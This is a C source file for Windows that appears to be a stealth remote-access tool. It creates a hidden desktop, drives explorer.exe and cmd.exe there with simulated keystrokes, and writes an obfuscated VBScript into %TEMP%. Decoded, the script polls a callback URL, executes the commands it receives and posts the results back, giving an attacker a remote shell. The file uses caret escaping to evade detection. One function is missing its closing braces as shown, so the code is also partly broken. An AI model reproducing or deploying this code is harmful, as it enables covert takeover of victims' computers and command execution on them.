#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>

#define REALDELAY 150

unsigned char payload[] = { 64, 97, 101, 90, 96, 95, 17, 54, 105, 97, 93, 90, 84, 90, 101, -5, 64, 95, 17, 54, 99, 99, 96, 99, 
17, 67, 86, 100, 102, 94, 86, 17, 63, 86, 105, 101, -5, 52, 64, 63, 68, 69, 17, 84, 82, 93, 93, 83, 82, 84, 92, 70, 99, 93, 17,
46, 17, 19, 89, 101, 101, 97, 43, 32, 32, 34, 42, 35, 31, 34, 39, 41, 31, 38, 39, 31, 34, 43, 41, 33, 32, 19, -5, 53, 90, 94, 17,
105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 29, 17, 100, 89, 86, 93, 93, 29, 17, 86, 105, 86, 84, 64, 83, 91, 29, 17, 84, 96, 94,
94, 82, 95, 85, 29, 17, 83, 99, 86, 82, 92, 29, 17, 99, 86, 100, 102, 93, 101, -5, 68, 86, 101, 17, 100, 89, 86, 93, 93, 17, 46,
17, 52, 99, 86, 82, 101, 86, 64, 83, 91, 86, 84, 101, 25, 19, 72, 68, 84, 99, 90, 97, 101, 31, 68, 89, 86, 93, 93, 19, 26, -5, 83,
99, 86, 82, 92, 17, 46, 17, 55, 82, 93, 100, 86, -5, 72, 89, 90, 93, 86, 17, 83, 99, 86, 82, 92, 17, 45, 47, 17, 69, 99, 102, 86,
-5, 68, 86, 101, 17, 105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 17, 46, 17, 72, 68, 84, 99, 90, 97, 101, 31, 52, 99, 86, 82, 101,
86, 64, 83, 91, 86, 84, 101, 25, 19, 62, 68, 73, 62, 61, 35, 31, 68, 86, 99, 103, 86, 99, 73, 62, 61, 57, 69, 69, 65, 19, 26, -5,
105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 31, 64, 97, 86, 95, 17, 19, 56, 54, 69, 19, 29, 17, 84, 82, 93, 93, 83, 82, 84, 92, 70,
99, 93, 29, 17, 87, 82, 93, 100, 86, -5, 105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 31, 68, 86, 95, 85, -5, 84, 96, 94, 94, 82, 95,
85, 17, 46, 17, 19, 84, 94, 85, 17, 32, 84, 17, 19, 17, 23, 17, 69, 99, 90, 94, 25, 105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 31,
99, 86, 100, 97, 96, 95, 100, 86, 69, 86, 105, 101, 26, -5, 58, 87, 17, 58, 95, 68, 101, 99, 25, 84, 96, 94, 94, 82, 95, 85, 29, 17,
19, 54, 73, 58, 69, 19, 26, 17, 69, 89, 86, 95, -5, 83, 99, 86, 82, 92, 17, 46, 17, 69, 99, 102, 86, -5, 54, 93, 100, 86, -5, 68, 86,
101, 17, 86, 105, 86, 84, 64, 83, 91, 17, 46, 17, 100, 89, 86, 93, 93, 31, 54, 105, 86, 84, 25, 84, 96, 94, 94, 82, 95, 85, 26, -5,
99, 86, 100, 102, 93, 101, 17, 46, 17, 19, 19, -5, 53, 96, 17, 70, 95, 101, 90, 93, 17, 86, 105, 86, 84, 64, 83, 91, 31, 68, 101, 85,
64, 102, 101, 31, 50, 101, 54, 95, 85, 64, 87, 68, 101, 99, 86, 82, 94, -5, 99, 86, 100, 102, 93, 101, 17, 46, 17, 99, 86, 100, 102,
93, 101, 17, 23, 17, 86, 105, 86, 84, 64, 83, 91, 31, 68, 101, 85, 64, 102, 101, 31, 67, 86, 82, 85, 50, 93, 93, 25, 26, -5, 61, 96,
96, 97, -5, 68, 86, 101, 17, 105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 17, 46, 17, 72, 68, 84, 99, 90, 97, 101, 31, 52, 99, 86, 82,
101, 86, 64, 83, 91, 86, 84, 101, 25, 19, 62, 68, 73, 62, 61, 35, 31, 68, 86, 99, 103, 86, 99, 73, 62, 61, 57, 69, 69, 65, 19, 26, -5,
105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 31, 64, 97, 86, 95, 17, 19, 65, 64, 68, 69, 19, 29, 17, 84, 82, 93, 93, 83, 82, 84, 92, 70,
99, 93, 29, 17, 87, 82, 93, 100, 86, -5, 105, 94, 93, 57, 101, 101, 97, 67, 86, 98, 31, 68, 86, 95, 85, 25, 99, 86, 100, 102, 93, 101,
26, -5, 54, 95, 85, 17, 58, 87, -5, 72, 86, 95, 85, -5 };

HWND searchWindow(char *);
HWND getHandle(HWND);
void quickStartFocus(HWND);
void sendChars(HWND, char *);
void deleteChars(HWND);
void writeF1le(HWND);
void sendEscape(HWND);
void doConnectBack(HWND);

void quickStartFocus(HWND windowExplorer){
	PostMessage(windowExplorer, WM_KEYDOWN, VK_F4, 1);
	Sleep(1000);
}

HWND searchWindow(char *window){
	for (HWND hwnd = GetTopWindow(NULL); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT)){   
	
		if (!IsWindowVisible(hwnd))
			continue;

		int length = GetWindowTextLength(hwnd);
		
		if (length == 0)
			continue;

		char title[length+1];
		GetWindowText(hwnd, title, length+1);
		if(strstr(title, window) != 0){
			HWND newhwnd = malloc(sizeof(hwnd));
			newhwnd = hwnd;
			return newhwnd;
		}

void sendEscape(HWND handle){
	PostMessage(handle, WM_CHAR, '^', 1);
}

void deleteChars(HWND handle){
	int i;
	for(i = 0; i < 15; i++){
		PostMessage(handle, WM_CHAR, VK_BACK, 1);
		//Sleep(REALDELAY);
	}
}

void sendChars(HWND handle, char *comando){
	int len = strlen(comando);
	int i;
	
	for(i = 0; i < len; i++){
		if(comando[i] == '#'){
			PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
			continue;
		}
		PostMessage(handle, WM_CHAR, comando[i], 1);
	}
}

HWND getHandle(HWND window){
	
	DWORD threadProcessId =	GetWindowThreadProcessId(window, 0);
	
	GUITHREADINFO infosThread;
	infosThread.cbSize = sizeof(GUITHREADINFO);
	
	GetGUIThreadInfo(threadProcessId, &infosThread);
	
	HWND focusHandle = malloc(sizeof(infosThread.hwndFocus));
	
	focusHandle = infosThread.hwndFocus;
	
	return focusHandle;
}

void writeF1le(HWND handle){
	int i;
	
	char *enterTemp = "cd %TEMP%#";
	char *startCmd = "ec^ho ";
	char *endCmd = " >> s^c^ript.v^bs#";
	
	sendChars(handle, enterTemp);
	
	sendChars(handle, startCmd);
	for(i = 0; i < sizeof(payload); i++){
		if(payload[i] == 251){
			sendChars(handle, endCmd);
			sendChars(handle, startCmd);
			continue;
		}
		if((payload[i]+15) == 38){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, payload[i]+15, 1);
			continue;
		}
		if((payload[i]+15) == 60){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, payload[i]+15, 1);
			continue;
		}
		if((payload[i]+15) == 62){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, payload[i]+15, 1);
			continue;
		}
		
		PostMessage(handle, WM_CHAR, payload[i]+15, 1);
	}
	
	PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
}

void doConnectBack(HWND handle){
	char *cmd = "cs^cr^i^pt sc^ri^p^t.vbs#";
	sendChars(handle, cmd);
}
	
int main(void){

	char *desktopName = "stealthy";
	HDESK windowStealthy;
	
	windowStealthy = CreateDesktopA(desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);

	if(windowStealthy == NULL){
		DWORD dw = GetLastError();
		printf("CreateDesktop error: %d!\n", dw);
	}
	else{
		printf("CreateDesktop ok!\n");
	}
	
	SetThreadDesktop(windowStealthy);
	
	STARTUPINFOA startupInfo;
	PROCESS_INFORMATION processInformation; 
	
	memset(&startupInfo, 0, sizeof(startupInfo));
	memset(&processInformation, 0, sizeof(processInformation));
	
	startupInfo.lpDesktop = desktopName;
	BOOL create = CreateProcessA(NULL, "explorer.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation);
	
	Sleep(2000);
	
	HWND windowExplorer = searchWindow("Explorador");
	
	quickStartFocus(windowExplorer);
	
	HWND handleExplorerFocus = getHandle(windowExplorer);
	
	deleteChars(handleExplorerFocus);
	
	char *cmd = "cmd.exe#";
	sendChars(handleExplorerFocus, cmd);
	
	Sleep(800);
	
	HWND windowCmd = searchWindow("cmd.exe");
	
	writeF1le(windowCmd);
	
	doConnectBack(windowCmd);
	
	if(create){
		printf("Process created!\n");
	}
	else{
		printf("Error on create!\n");
	}

	CloseDesktop(windowStealthy);
	CloseHandle(windowCmd);
	CloseHandle(windowExplorer);
	CloseHandle(handleExplorerFocus);
	
	free(handleExplorerFocus);
	free(windowCmd);
	free(windowExplorer);
	
	return 0;
}




